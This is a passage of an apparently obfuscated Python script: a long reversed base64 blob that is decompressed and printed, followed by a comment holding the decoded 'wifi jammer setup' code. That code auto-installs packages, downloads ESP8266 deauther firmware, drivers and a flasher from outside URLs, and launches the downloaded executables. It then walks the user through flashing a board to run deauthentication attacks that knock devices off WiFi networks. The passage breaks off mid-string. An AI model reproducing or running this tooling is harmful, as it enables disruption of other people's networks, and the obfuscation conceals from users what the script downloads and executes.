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'

s3 = b'=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'
b64 = base64.b64decode(s3[::-1])
print(zlib.decompress(b64))

# Here is the deobfuscated code :
#b'# scripted by samay \n# esp8266 wifi jammer setup through script\n# Encrypted by samay \n# Author : Samay \n# Normally all setup through script \n\n# --- modules \n\nimport os \nimport sys\ntry:\n    import colorama\n    import requests\n    import wget\nexcept ImportError:\n    os.system(\'pip install colorama\' if os.name==\'nt\' else \'pip3 install colorama\')\n    os.system(\'pip install requests\' if os.name==\'nt\' else \'pip3 install requests\')\n    os.system(\'pip install wget\' if os.name==\'nt\' else \'pip3 install wget\')\nimport wget\nimport shutil\nfrom time import sleep\nfrom zipfile import ZipFile\nfrom colorama import Fore\nfrom getpass import getpass\n\n\n# --- colors \nr = "\\033[1;31m"\ng = "\\033[1;32m"\ny = "\\033[1;33m"\nb = "\\033[1;34m"\nd = "\\033[2;37m"\nR = "\\033[1;41m"\nY = "\\033[1;43m"\nB = "\\033[1;44m"\nw = "\\033[1;37m"\ng = "\\033[0;90m"\ny = r\n\n# ---- banner and functions \n\nlogo = \'\'\'\n    \\033[1;31m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97        \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\n    \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91        \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n    \\033[0;90m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\\033[1;33m    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\033[1;33m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n    \\033[1;33m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \\033[1;34m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n    \\033[1;35m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91           \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\n    \\033[1;31m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d           \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d    \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\n\'\'\'\n\ndef banner():\n    print(logo)\n\ndef clear():\n    os.system(\'cls\' if os.name==\'nt\' else \'clear\')\n\ndef _under_():\n    print(\'\\n\')\n\ndef aboutus():\n    string = """ \n    \\033[1;37mDeveloper  \\033[1;34m: \\033[1;31mSamay825\n    \\033[1;37mGithub     \\033[1;34m: \\033[1;31mSamay825\n    \\033[1;37mInstagram  \\033[1;34m: \\033[1;31m@sincryptzork\n    """\n    for i in string:\n        sys.stdout.write(i)\n        sys.stdout.flush()\n        sleep(0.01)\n    _under_()\n\ndef folder(khushi):\n    if not os.path.exists(khushi):\n        os.makedirs(khushi)\n\n\ndef printcontent(samay):\n    print(r+"\xe2\x94\x94\xe2\x94\x80> "+w+"\\033[1;37m"+samay)\n\ndef optionsfront():\n    clear()\n    banner()\n    aboutus()\n    printcontent(\'[ 1 ] Wifi Jammer Setup\')\n    printcontent(\'[ 2 ] Instructions \')\n    printcontent(\'[ 3 ] About me \')\n    printcontent(\'[ 4 ] Update\')\n    printcontent(\'[ 5 ] Exit \')\n    _under_()\n\noptionsfront()\n\ndef frontclearsecond():\n    clear()\n    banner()\n    _under_()\n\n# --- Object oriented programming \n\nclass Samay:\n    project = \'Nodemcu esp8266\'\n    def __init__(self,data):\n        self.data = data\n    def functions(self):\n        if self.data==1:\n            folder(\'Wifi-Jammer-Setup\')\n            frontclearsecond()\n            samayfunctions = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mDo you have nodemcu esp8266 or other version ? [y/n] : "+r)\n            if samayfunctions==\'Y\' or samayfunctions==\'y\':\n                frontclearsecond()\n                printcontent(\'[ 1 ] Chip CP2102\')\n                printcontent(\'[ 2 ] Chip CP340\')\n                _under_()\n                samayfuc1 = int(input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Desire options : "+r))\n                if samayfuc1==1:\n                    _under_()\n                    printcontent(\'Downloading CP2102 Windows Driver ..\'+g)\n                    try:\n                        wget.download(\'https://www.silabs.com/documents/public/software/CP210x_Windows_Drivers.zip\')\n                        _under_()\n                        shutil.move(\'CP210x_Windows_Drivers.zip\',\'Wifi-Jammer-Setup/\')\n                        printcontent(\'Downloading Nodemcu flasher ..\')\n                        wget.download(\'https://github.com/nodemcu/nodemcu-flasher/archive/refs/heads/master.zip\')\n                        _under_()\n                        shutil.move(\'nodemcu-flasher-master.zip\',\'Wifi-Jammer-Setup/\')\n                        printcontent(\'Downloading nodemcu file bin ..\')\n                        wget.download(\'https://github.com/SpacehuhnTech/esp8266_deauther/releases/download/2.6.1/esp8266_deauther_2.6.1_NODEMCU.bin\')\n                        _under_()\n                        shutil.move(\'esp8266_deauther_2.6.1_NODEMCU.bin\',\'Wifi-Jammer-Setup/\')\n                        frontclearsecond()\n                        printcontent(\'All requirements downloaded \')\n                        printcontent(\'Please wait ..\')\n                        sleep(2.3)\n                        frontclearsecond()\n                        printcontent(\'Extract the two files present in Wifi-Jammer-Folder\')\n                        _under_()\n                        oks = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mExtracted zip ? [ y/n ] : "+r).strip()\n                        if oks==\'y\' or oks==\'Y\':\n                            samaysir2 = True\n                        else:\n                            printcontent(\'Extract now ..\')\n                            samaysir2 = False\n                     \n                    except:\n                        pass\n\n\n                    if samaysir2:\n                        os.startfile(\'Wifi-Jammer-Setup\\\\CP210x_Windows_Drivers\\\\CP210xVCPInstaller_x64.exe\')\n                        sleep(2.0)\n                        os.startfile(\'Wifi-Jammer-Setup\\\\nodemcu-flasher-master\\\\nodemcu-flasher-master\\\\Win64\\\\Release\\\\ESP8266Flasher.exe\')\n                        sleep(1.0)\n                        frontclearsecond()\n                        printcontent(\'plug in with datacable nodemcu now and select advanced option in flasher ..\')\n                        _under_()\n                        printcontent(\'baudrate size : 9600\')\n                        printcontent(\'flash size : 1 mb\')\n                        printcontent(\'flash speed : 80 mhz \')\n                        printcontent(\'SPI MODE : DIO\')\n                        _under_()\n                        printcontent(\'Now select the config file from wifi-jammer-setup folder named nodemcu.bin shown in the youtube visit ..\')\n                        _under_()\n                        printcontent(\'now start the flash ......\')\n                        printcontent(\'after flash connect to the new wifi named pwned  password is : deauther\')\n                        printcontent(\'now open browser go to this ip : 192.168.4.1\')\n                        printcontent(\'enjoy .....\')\n                        print(\'\\n\')\n                    elif samaysir2==False:\n                        ss = input(\'Extracted ?  [y/n] : \')\n                        if ss==\'y\':\n                            os.startfile(\'Wifi-Jammer-Setup\\\\CP210x_Windows_Drivers\\\\CP210xVCPInstaller_x64.exe\')\n                            sleep(2.0)\n                            os.startfile(\'Wifi-Jammer-Setup\\\\nodemcu-flasher-master\\\\nodemcu-flasher-master\\\\Win64\\\\Release\\\\ESP8266Flasher.exe\')\n                            frontclearsecond()\n                            printcontent(\'plug in with datacable nodemcu now and select advanced option in flasher ..\')\n                            _under_()\n                            printcontent(\'baudrate size : 9600\')\n                            printcontent(\'flash size : 1 mb\')\n                            printcontent(\'flash speed : 80 mhz \')\n                            printcontent(\'SPI MODE : DIO\')\n                            _under_()\n                            printcontent(\'Now select the config file from wifi-jammer-setup folder named nodemcu.bin shown in the youtube visit ..\')\n                            _under_()\n                            printcontent(\'now start the flash ......\')\n                            printcontent(\'after flash connect to the new wifi named pwned  password is : deauther\')\n                            printcontent(\'now open browser go to this ip : 192.168.4.1\')\n                            printcontent(\'enjoy .....\')\n                            print(\'\\n\')\n\n\n\n\n\n\n\n\n                elif samayfuc1==2:\n                    _under_()\n                    printcontent(\'Downloading CP304 Windows Driver ..\'+g)\n                    try:\n                        wget.download(\'https://sparks.gogo.co.nz/assets/_site_/downloads/CH34x_Install_Windows_v3_4.zip\')\n                        _under_()\n                        shutil.move(\'CH34x_Install_Windows_v3_4.zip\',\'Wifi-Jammer-Setup/\')\n                        printcontent(\'Downloading Nodemcu flasher ..\')\n                        wget.download(\'https://github.com/nodemcu/nodemcu-flasher/archive/refs/heads/master.zip\')\n                        _under_()\n                        shutil.move(\'nodemcu-flasher-master.zip\',\'Wifi-Jammer-Setup/\')\n                        printcontent(\'Downloading nodemcu file bin ..\')\n                        wget.download(\'https://github.com/SpacehuhnTech/esp8266_deauther/releases/download/2.6.1/esp8266_deauther_2.6.1_NODEMCU.bin\')\n                        _under_()\n                        shutil.move(\'esp8266_deauther_2.6.1_NODEMCU.bin\',\'Wifi-Jammer-Setup/\')\n                        frontclearsecond()\n                        printcontent(\'All requirements downloaded \')\n                        printcontent(\'Please wait ..\')\n                        sleep(2.3)\n                        frontclearsecond()\n                        printcontent(\'Extract the two files present in Wifi-Jammer-Folder\')\n                        _under_()\n                        oks = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mExtracted zips ? [ y/n ] : "+r).strip()\n                        if oks==\'y\' or oks==\'Y\':\n                            samaysir = True\n                        else:\n                            printcontent(\'Extract now ..\')\n                            samaysir = False\n                     \n                    except:\n                        pass\n\n                    if samaysir==True:\n                        ss = input(\'Extracted ?  [y/n] : \')\n                        if ss==\'y\':\n                            os.startfile(\'Wifi-Jammer-Setup\\\\CH34x_Install_Windows_v3_4\\\\CH34x_Install_Windows_v3_4.EXE\')\n                            sleep(2.0)\n                            os.startfile(\'Wifi-Jammer-Setup\\\\nodemcu-flasher-master\\\\nodemcu-flasher-master\\\\Win64\\\\Release\\\\ESP8266Flasher.exe\')\n                            sleep(1.0)\n                            frontclearsecond()\n                            printcontent(\'plug in with datacable nodemcu now and select advanced option in flasher ..\')\n                            _under_()\n                            printcontent(\'baudrate size : 9600\')\n                            printcontent(\'flash size : 1 mb\')\n                            printcontent(\'flash speed : 80 mhz \')\n                            printcontent(\'SPI MODE : DIO\')\n                            _under_()\n                            printcontent(\'Now select the config file from wifi-jammer-setup folder named nodemcu.bin shown in the youtube visit ..\')\n                            _under_()\n                            printcontent(\'now start the flash ......\')\n                            printcontent(\'after flash connect to the new wifi named pwned  password is : deauther\')\n                            printcontent(\'now open browser go to this ip : 192.168.4.1\')\n                            printcontent(\'enjoy .....\')\n            elif samayfunctions==\'N\' or samayfunctions==\'n\':\n                _under_()\n                printcontent("You can\'t perform wifi jammer without node-MCU please buy the Nodemcu ")\n                printcontent(\'Link to buy : \'+Fore.GREEN+\'https://amzn.to/3LjeBmm\')\n                sys.exit(\'\\n\'+r+"\xe2\x94\x94\xe2\x94\x80"+w+"Comeback with nodemcu and re run script !\\n")\n                _under_()\n        #\n\n        elif self.data==2:\n            samay = Fore.BLUE+\'\'\'\\nThis software allows you to easily perform a variety of actions to test 802.11 wireless networks by using an inexpensive ESP8266 WiFi SoC (System On A Chip).\n\nThe main feature, the deauthentication attack, is used to disconnect devices from their WiFi network.\nNo one seems to care about this huge vulnerability in the official 802.11 WiFi standard, so I took action and enabled everyone who has less than 10 USD to spare to recreate this project.\nI hope it raises more attention on the issue. In 2009 the WiFi Alliance actually fixed the problem (see 802.11w), but only a few companies implemented it into their devices and software.\nTo effectively prevent a deauthentication attack, both client and access point must support the 802.11w standard with protected management frames (PMF).\nWhile most client devices seem to support it when the access point forces it, basically no WiFi access point has it enabled.\n\nFeel free to test your hardware out, annoy these companies with the problem, share this project and push for a fix! This project is also a great way to learn more about WiFi, micro controllers, Arduino, hacking and electronics/programming in general.\nBut please use this tool responsibly and do not use it against others without their permission!\\n\'\'\'\n            print(samay)\n\n        elif self.data==3:\n            samay23 = Fore.GREEN+\'\'\'hi, i\'m 